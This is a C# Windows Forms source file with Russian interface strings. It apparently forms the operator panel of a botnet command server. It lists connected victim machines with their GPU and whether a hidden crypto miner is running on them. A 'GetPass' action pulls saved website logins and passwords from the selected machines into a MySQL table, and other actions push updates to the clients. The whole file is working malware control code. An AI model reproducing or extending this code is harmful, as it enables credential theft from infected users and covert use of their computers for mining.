using System;
using System.Net;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using ServerWorker.Server;
using Interfaces;

namespace ServerWorker
{
    public enum UserInterface { mainServer, secondServer }
    public partial class Form1 : Form
    {
        public delegate void InterfaceEventHandler(UserInterface arg);
        public event InterfaceEventHandler InterfaceChanged;

        private List<Control> mainControls = new List<Control>();
        private List<Control> secondControls = new List<Control>();
        private ContextMenuStrip menu;

        private UserInterface interfaces = UserInterface.mainServer;
        public UserInterface Interfaces
        {
            get { return interfaces; }
            set
            {
                interfaces = value;
                InterfaceChanged(Interfaces);              
            }
        }


        public Form1()
        {
            InitializeComponent();
            //Вот я дал!
            InterfaceChanged += (UserInterface arg) => {
                if (Program.form1.InvokeRequired) Program.form1.BeginInvoke(new Action(() => { Program.form1.Form1_InterfaceChanged(arg); }));
                else Program.form1.Form1_InterfaceChanged(arg);
            };

            Program.server.Events.OnAuthorized += UpdateClientList;
            UserCard.UserData.OnDataUpdate += UpdateClientList;
            Program.server.Events.OnConnected += (User user) => { user.OnPingUpdate += UpdatePing; UpdateClientList(); };
            Program.server.Events.OnDisconnect += (User user) => { user.OnPingUpdate -= UpdatePing; UpdateClientList(); };
            InitContextMenuStrip();
            mainControls.Add(button1);
            secondControls.Add(button8);
        }

        private void InitContextMenuStrip()
        {
            menu = new ContextMenuStrip(this.components);
            menu.Items.Add("Открыть");
            menu.Items[0].Click += (object sender, EventArgs e) => OpenSelectedUserCard();
            menu.Items.Add("Обновить");
            menu.Items[1].Click += (object sender, EventArgs e) =>
            {
                foreach (int index in listView1.SelectedIndices)
                {
                    ServerNet.ConnectedUsers.ToArray()[index].UsersCom.DownloadUpdate();
                }
            };
            menu.Items.Add("Reconnect");
            menu.Items[2].Click += (object sender, EventArgs e) => 
            {
                foreach (int index in listView1.SelectedIndices)
                {
                    ServerNet.ConnectedUsers.ToArray()[index].UsersCom.Reconnect();
                }
            };
            menu.Items.Add("Отключить");
            menu.Items[3].Click += (object sender, EventArgs e) => DisconnectCurrentUsers();
            menu.Items.Add("Переименовать");
            menu.Items[4].Click += (object sender, EventArgs e) =>
            {
                List<User> users = new List<User>();
                foreach (int index in listView1.SelectedIndices)
                {
                    users.Add(ServerNet.ConnectedUsers.ToArray()[index]);
                }
                InputForm userCard = new InputForm(users.ToArray());
                userCard.Show();
            };
            menu.Items.Add("GetPass");
            menu.Items[5].Click += (object sender, EventArgs e) =>
            {
                List<User> users = new List<User>();
                foreach (int index in listView1.SelectedIndices)
                {
                    users.Add(ServerNet.ConnectedUsers.ToArray()[index]);
                }
                GetPass(users);
            };
        }

        private void DisconnectCurrentUsers()
        {
            DialogResult result = MessageBox.Show("Отключить выбранных пользователей ?","Предупреждение",MessageBoxButtons.YesNo);
            if (result == DialogResult.Yes)
            {
                foreach(int index in listView1.SelectedIndices)
                {
                    ServerNet.ConnectedUsers.ToArray()[index].UsersCom.Disconnect();
                }
            }
        }

        private void UpdateClientList()
        {
            listView1.BeginInvoke(new Action(() =>
            {
                listView1.Items.Clear();
                foreach (User user in ServerNet.ConnectedUsers.ToArray())
                {
                        DrawUser(user);
                }
            }));


            if (label1.InvokeRequired) label1.BeginInvoke(new Action(() =>
            {
                label1.Text = "Клиенты: " + ServerNet.ConnectedUsers.ToArray().Length;
            }));
            else
            {
                label1.Text = "Клиенты: " + ServerNet.ConnectedUsers.ToArray().Length;
            }

        }

        public void UpdatePing(User user)
        {
            listView1.BeginInvoke(new Action( () => listView1.Items[ServerNet.ConnectedUsers.IndexOf(user)].SubItems[7].Text = user.Ping.ToString()));
        }

        private void DrawUser(User user)
        {
            string[] raw;
            if (user.userData != null)
            {
                raw = new string[] {
                user.UserType.ToString(),
                user.userData.setting.Version ?? "",
                user.userData.setting.Comp_name ?? "",
                user.EndPoint.ToString(),
                "",
                user.userData.IsWorkinMiner.ToString(),
                user.userData.IsGettingLoginData ? "V" : "",
                user.Ping.ToString()
                };
                if (user.userData.infoDevice.GPUVideoProcessor.Count > 0)
                {
                    raw[4] = user.userData.infoDevice.GPUVideoProcessor[0];
                }
            }
            else
            {
                raw = new string[] {
                user.UserType.ToString(),
                "",
                "",
                user.EndPoint.ToString(),
                "",
                "",
                ""
                };
            }
                ListViewItem viewItem = new ListViewItem(raw);
                listView1.Items.Add(viewItem);
        }

        private void Form1_InterfaceChanged(UserInterface arg)
        {
            switch (arg)
            {
                case UserInterface.mainServer:
                    {
                        foreach(Control element in mainControls)
                        {
                            element.Visible = true;
                        }
                        foreach (Control element in secondControls)
                        {
                            element.Visible = false;
                        }
                    }
                    break;
                case UserInterface.secondServer:
                    {
                        foreach (Control element in secondControls)
                        {
                            element.Visible = true;
                        }
                        foreach (Control element in mainControls)
                        {
                            element.Visible = false;
                        }
                    }
                    break;
                default:
                    {
                        foreach (Control element in mainControls)
                        {
                            element.Visible = false;
                        }
                        foreach (Control element in secondControls)
                        {
                            element.Visible = false;
                        }
                    }
                    break;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            DialogResult result = MessageBox.Show("Вы действительно хотите обновить всех клиентов ?", "Предупреждение", MessageBoxButtons.YesNo);
            if (result == DialogResult.Yes)
            {
                foreach (User user in ServerNet.ConnectedUsers.ToArray().Where(x => x.UserType == UserType.User))
                    user.UsersCom.DownloadUpdate();
                Log.Send("Сервер: Обновить клиенты");
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                if (Program.aviableServer != null)
                    Program.aviableServer.Close();

                Program.serverThread.Abort();
            }
            catch (Exception ex)
            {
                Log.Send("Form1_FormClosing " + ex.Message);
            }
        }

        private void GetPass(List<User> users)
        {        
            foreach (User user in users)
            {
                var loginDataList = user.UsersCom.SendLoginData("");
                MySQLData data = new MySQLData() { Table = "LoginData", Columns = new string[] { "Site", "Login", "Password", "UserId" } };
                foreach (LoginData loginData in loginDataList)
                {
                    if (!string.IsNullOrWhiteSpace(loginData.WebSite) || !string.IsNullOrWhiteSpace(loginData.Login) || !string.IsNullOrWhiteSpace(loginData.Pass))
                        data.Values.Add(new string[] { loginData.WebSite, loginData.Login, loginData.Pass, user.userData.id });
                }

                var dataCount = data.Values.Count;
                if (dataCount > 0)
                {
                    MySQLManager.Send(data);

                }
                else MessageBox.Show("Паролей не найдено");

                user.userData.IsGettingLoginData = true;
                if (user.userData.id != "")
                    user.userData.SaveDataToFile(user.userData.id + ".xml");

                if (dataCount > 0) MessageBox.Show("Получено строк: " + dataCount);
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            //WrileClientsInList();
            DialogResult result = MessageBox.Show("Вы действительно хотите обновить всех старых клиентов ?", "Предупреждение", MessageBoxButtons.YesNo);
            if (result == DialogResult.Yes)
            {
                foreach (User user in ServerNet.ConnectedUsers.ToArray().Where(x => x.UserType == UserType.UnAuthorized))
                {
                    NetworkStream s = user._socket.GetStream();
                    byte[] bytes = Encoding.UTF8.GetBytes("DownlUpd");
                    s.BeginWrite(bytes, 0, bytes.Length,
                        new AsyncCallback(EndWriteCallback),
                        s);
                }
                Log.Send("Сервер: Обновить старые клиенты");
            }
        }
        public void EndWriteCallback(IAsyncResult ars)
        {
            NetworkStream authStream = (NetworkStream)ars.AsyncState;
            authStream.EndWrite(ars);
        }


        private void StartForm2(User user )
        {
            FormUserCard userCard = new FormUserCard(user);
            userCard.Show();
        }

        private void button7_Click(object sender, EventArgs e)
        {
            listBox2.Items.Clear();
        }

        private void button8_Click(object sender, EventArgs e)
        {
            UpdateClientList();
        }


        private void OpenSelectedUserCard()
        {
            if (listView1.SelectedIndices.Count >= 0)
            {
                foreach (int index in listView1.SelectedIndices)
                {
                    if (ServerNet.ConnectedUsers.ToArray().Count() > index)
                    {
                        StartForm2(ServerNet.ConnectedUsers.ToArray()[index]);
                    }
                    else
                    {
                        Log.Send("Ошибка получения доступу к элементу, такого элемента не существует или он имеет другой индекс");
                    }
                }
            }
            else
            {
                Log.Send("Ошибка, индекс элемента не попадает в допустимый диапазон");
            }
        }

        private void listView1_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                menu.Show(listView1, e.X, e.Y);
            }
        }

        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                OpenSelectedUserCard();
            }
        }
    }
}
